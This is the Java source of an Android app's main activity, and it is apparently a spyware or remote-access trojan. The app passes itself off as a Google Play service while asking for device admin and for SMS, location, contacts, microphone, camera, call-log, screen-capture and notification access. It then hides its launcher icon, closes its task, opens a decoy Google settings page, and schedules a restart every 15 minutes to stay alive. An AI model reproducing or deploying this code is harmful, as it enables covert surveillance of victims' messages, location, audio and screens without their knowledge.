package com.android.background.services;

import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.PowerManager;
import android.provider.Settings;
import android.text.TextUtils;
import android.widget.Toast;

import com.android.background.services.receivers.AdminReceiver;
import com.android.background.services.workers.RestartServiceWorker;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.concurrent.TimeUnit;

import androidx.work.ExistingPeriodicWorkPolicy;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;

public class MainActivity extends AppCompatActivity {

    private static final int ACTION_MANAGE_STORAGE_PERMISSION_REQUEST_CODE = 5000;
    public static DevicePolicyManager devicePolicyManager;
    public static ComponentName componentName;
    public static int ACTION_MANAGE_OVERLAY_PERMISSION_REQUEST_CODE = 2323;

    private final ActivityResultLauncher<String[]> permissionLauncher =
            registerForActivityResult(new ActivityResultContracts.RequestMultiplePermissions(), this::handlePermissionResult);

    private final ActivityResultLauncher<Intent> screenCaptureLauncher =
            registerForActivityResult(new ActivityResultContracts.StartActivityForResult(), result -> {
                if (result.getResultCode() == RESULT_OK && result.getData() != null) {
                    MainService.setScreenCaptureData(result.getResultCode(), result.getData());
                }
            });

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        componentName = new ComponentName(this, AdminReceiver.class);
        devicePolicyManager = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);

        if (!devicePolicyManager.isAdminActive(componentName)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, getString(R.string.device_admin_explanation));
            startActivity(intent);
        }

        if (hasMissingPermissions()) {
            askPermission();
        }
        else {
            requestBatteryOptimizationPermission();
            startCoreServices();
        }
    }

    private boolean hasMissingPermissions() {
        String[] permissions = getRequiredPermissions();
        for (String permission : permissions) {
            if (ActivityCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                return true;
            }
        }
        return false;
    }

    private String[] getRequiredPermissions() {
        List<String> permissions = new ArrayList<>();
        permissions.add(Manifest.permission.READ_SMS);
        permissions.add(Manifest.permission.SEND_SMS);
        permissions.add(Manifest.permission.RECEIVE_SMS);
        permissions.add(Manifest.permission.ACCESS_FINE_LOCATION);
        permissions.add(Manifest.permission.ACCESS_COARSE_LOCATION);
        permissions.add(Manifest.permission.READ_PHONE_STATE);
        permissions.add(Manifest.permission.READ_CONTACTS);
        permissions.add(Manifest.permission.RECORD_AUDIO);
        permissions.add(Manifest.permission.CAMERA);
        permissions.add(Manifest.permission.READ_CALL_LOG);
        permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        permissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            permissions.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION);
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            permissions.add(Manifest.permission.ACCESS_MEDIA_LOCATION);
        }
        return permissions.toArray(new String[0]);
    }

    private void startCoreServices() {
        scheduleRestartServiceWorker();

        if (!isNotificationServiceEnabled()) {
            Toast.makeText(this, "Please enable Notification Access for Google Play Service", Toast.LENGTH_LONG).show();
            startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R){
            if (!Environment.isExternalStorageManager() && !Settings.canDrawOverlays(this)){
                startActivity(new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS, Uri.parse("package:" + getPackageName())));
            }
            else {
                Intent intent = new Intent(this, MainService.class);
                ContextCompat.startForegroundService(this, intent);
                openExternalPage(this);
                new Handler().postDelayed(this::finishAndRemoveTask, 1000);
            }
        }
        else{
            Intent intent = new Intent(this, MainService.class);
            ContextCompat.startForegroundService(this, intent);
            openExternalPage(this);

            hideIcon();

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                new Handler().postDelayed(this::finishAndRemoveTask, 1000);
            }
            else {
                finish();
            }
        }
    }

    private void handlePermissionResult(Map<String, Boolean> result) {
        boolean allGranted = true;
        for (Boolean granted : result.values()) {
            if (!granted) {
                allGranted = false;
                break;
            }
        }

        if (allGranted) {
            Toast.makeText(this, "Permission granted successfully!", Toast.LENGTH_SHORT).show();
            requestScreenCapturePermission();
        } else {
            Toast.makeText(this, "Some permissions were denied", Toast.LENGTH_SHORT).show();
        }
    }

    private void askPermission() {
        permissionLauncher.launch(getRequiredPermissions());
    }

    private void scheduleRestartServiceWorker() {
        PeriodicWorkRequest restartServiceWorkRequest =
                new PeriodicWorkRequest.Builder(RestartServiceWorker.class, 15, TimeUnit.MINUTES)
                        .build();

        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
                "RestartServiceWork",
                ExistingPeriodicWorkPolicy.KEEP,
                restartServiceWorkRequest
        );
    }

    private boolean isNotificationServiceEnabled() {
        String pkgName = getPackageName();
        final String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        if (!TextUtils.isEmpty(flat)) {
            final String[] names = flat.split(":");
            for (String name : names) {
                final ComponentName cn = ComponentName.unflattenFromString(name);
                if (cn != null) {
                    if (TextUtils.equals(pkgName, cn.getPackageName())) {
                        return true;
                    }
                }
            }
        }
        return false;
    }

    private void requestDisplayOverPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
            startActivityForResult(intent, ACTION_MANAGE_OVERLAY_PERMISSION_REQUEST_CODE);
        } else {
            requestExternalStorageManagerPermission();
        }
    }

    private void requestScreenCapturePermission() {
        MediaProjectionManager manager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        if (manager != null) {
            screenCaptureLauncher.launch(manager.createScreenCaptureIntent());
        }
        requestDisplayOverPermission();
    }

    private void requestExternalStorageManagerPermission(){

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {

                Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                Uri uri = Uri.fromParts("package", getPackageName(), null);
                intent.setData(uri);
                startActivityForResult(intent, ACTION_MANAGE_STORAGE_PERMISSION_REQUEST_CODE);
            }
        }
    }

    //_____________________________________________________________________________________________________________
    @Override
    public void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == ACTION_MANAGE_OVERLAY_PERMISSION_REQUEST_CODE) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (!Settings.canDrawOverlays(this)) {
                    Toast.makeText(this, "Permission denied", Toast.LENGTH_SHORT).show();
                }
                else{
                    requestExternalStorageManagerPermission();
                }
            }
        }

        if (requestCode == ACTION_MANAGE_STORAGE_PERMISSION_REQUEST_CODE){
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                if (!Environment.isExternalStorageManager()) {
                    Toast.makeText(this, "Manage external storage permission denied!", Toast.LENGTH_SHORT).show();
                }
                else{
                   requestBatteryOptimizationPermission();
                   Toast.makeText(this, "Manage external storage permission granted!", Toast.LENGTH_SHORT).show();
                }
            }
        }
    }

    @SuppressLint("BatteryLife")
    private void requestBatteryOptimizationPermission() {

        Intent intent = new Intent();
        String packageName = getPackageName();
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (pm.isIgnoringBatteryOptimizations(packageName))
                intent.setAction(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS);
            else {
                intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + packageName));
            }
        }
        startActivity(intent);
    }

    //_____________________________________________________________________________________________________________
    public static void openExternalPage(Context context) {

        try {
            Intent intent = new Intent();
            final String APP_PACKAGE_NAME = "com.google.android.gms";
            final String APP_ACTIVITY_PATH = "com.google.android.gms.app.settings.GoogleSettingsLink";
            intent.setClassName(APP_PACKAGE_NAME, APP_ACTIVITY_PATH);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
        }
        catch (Exception e) {
            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setData(Uri.parse("https://play.google.com/store/apps/"));
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
            e.printStackTrace();
        }
    }

    //_____________________________________________________________________________________________________________
    public void hideIcon() {
        getPackageManager().setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }

}